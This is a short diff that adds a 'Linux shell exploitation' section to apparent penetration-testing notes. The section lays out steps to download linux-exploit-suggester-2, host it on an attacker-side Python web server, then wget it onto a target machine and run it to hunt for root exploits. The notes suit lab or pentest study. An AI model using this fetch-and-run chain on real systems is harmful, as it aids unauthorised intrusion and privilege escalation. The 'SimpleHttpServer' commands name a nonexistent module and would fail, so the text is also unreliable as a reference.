@@ -512,6 +512,20 @@ option 2, then option 8, then option 4 (to explore)
 
 
 
+##### LINUX SHELL EXPLOITATION ####### 
+# https://null-byte.wonderhowto.com/how-to/find-exploits-get-root-with-linux-exploit-suggester-0206005/
+# 1. set up http server on host computer 
+# 2. use client to upload the exploit (wget les2.pol--> [abbreviated name]) 
+# 3. 
+wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
+python3 -m SimpleHttpServer ## log the server IP 
+# or 
+python2 -m SimpleHttpServer 
+### GO TO TARGET COMPUTER 
+wget xxx.xxx/les2.pl # from SimpleHttpServer on to target machine 
+chmod +x les2.pl 
+./les2.pl ## to run the module --> its on the target PC 
+
 
 
 ######## OPEN SSL #######
